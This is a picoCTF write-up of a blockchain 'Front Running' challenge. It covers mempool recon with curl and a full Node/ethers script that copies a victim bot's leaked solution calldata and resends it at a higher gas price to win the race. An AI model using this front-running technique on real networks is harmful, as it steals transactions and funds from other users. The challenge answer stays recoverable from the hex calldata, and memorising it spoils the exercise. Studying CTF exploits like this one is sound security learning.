---
title: "Front_Running Writeup"
description: "picoCTF Front Running writeup monitoring the mempool for pending transactions, extracting the plaintext solution, and front-running with higher gas price."
category: "picoCTF - Blockchain"
tags: ["picoctf", "blockchain"]
published: true
---
# Front_Running Writeup

Flag: picoCTF{<redacted>}

Tools used
- `curl`
- `node`
- `npm install ethers@6`
- `ethers` (installed under `/tmp/node_modules`)
- `4byte.directory` for selector lookup

Endpoints
- Web app: `http://candy-mountain.picoctf.net:57899/`
- RPC: `http://candy-mountain.picoctf.net:50495`
- Contract: `0x5FbDB2315678afecb367f032d93F642f64180aa3`
- Attacker address: `0x471e0887aa4A667841758a7A6283616798e7cfB5`

Useful recon
```bash
curl -L http://candy-mountain.picoctf.net:57899/
curl -s http://candy-mountain.picoctf.net:57899/status
curl -s -X POST http://candy-mountain.picoctf.net:50495 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
curl -s -X POST http://candy-mountain.picoctf.net:50495 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x5FbDB2315678afecb367f032d93F642f64180aa3","latest"],"id":1}'
curl -L -s 'https://www.4byte.directory/api/v1/signatures/?hex_signature=0x76fe1e92'
```

Mempool monitoring
```bash
curl -s -X POST http://candy-mountain.picoctf.net:50495 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_pendingTransactions","params":[],"id":1}'
```

Victim pending transaction observed
```text
from: 0x70997970c51812dc3a010c7d01b50e0d17dc79c8
to:   0x5FbDB2315678afecb367f032d93F642f64180aa3
gasPrice: 0x3b9aca00 (1 gwei)
input: 0x76fe1e92000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000177069636f4354467b6d336d7030306c5f7031723474337d000000000000000000
decoded string: `picoCTF{<redacted>}`
```

Exploit idea
- The contract exposes `solve(string)` and checks `keccak256(input)` against a fixed target hash.
- The victim bot leaked the correct preimage in plaintext calldata while using only `1 gwei` gas price.
- Sending the exact same calldata from the attacker account with a higher gas price causes the miner to include the attacker transaction first.

Exploit script
```bash
cd /tmp
npm install ethers@6

node - <<'NODE'
const { ethers } = require('/tmp/node_modules/ethers');
const rpc = 'http://candy-mountain.picoctf.net:50495';
const pk = '0xa75e3cc6962770a9a7be58a9a01a4d594f2ce2d3d68dcc360c6d6550d22e8bfd';
const contract = '0x5FbDB2315678afecb367f032d93F642f64180aa3';
const data = '0x76fe1e92000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000177069636f4354467b6d336d7030306c5f7031723474337d000000000000000000';

(async () => {
  const provider = new ethers.JsonRpcProvider(rpc);
  const wallet = new ethers.Wallet(pk, provider);

  const tx = await wallet.sendTransaction({
    to: contract,
    data,
    gasLimit: 150000n,
    gasPrice: ethers.parseUnits('3', 'gwei'),
    nonce: await provider.getTransactionCount(wallet.address, 'pending')
  });

  await tx.wait();

  const flagData = await provider.call({ to: contract, data: '0xf9633930' });
  const [flag] = ethers.AbiCoder.defaultAbiCoder().decode(['string'], flagData);
  console.log(flag);
})();
NODE
```

Verification
```bash
curl -s http://candy-mountain.picoctf.net:57899/status
```
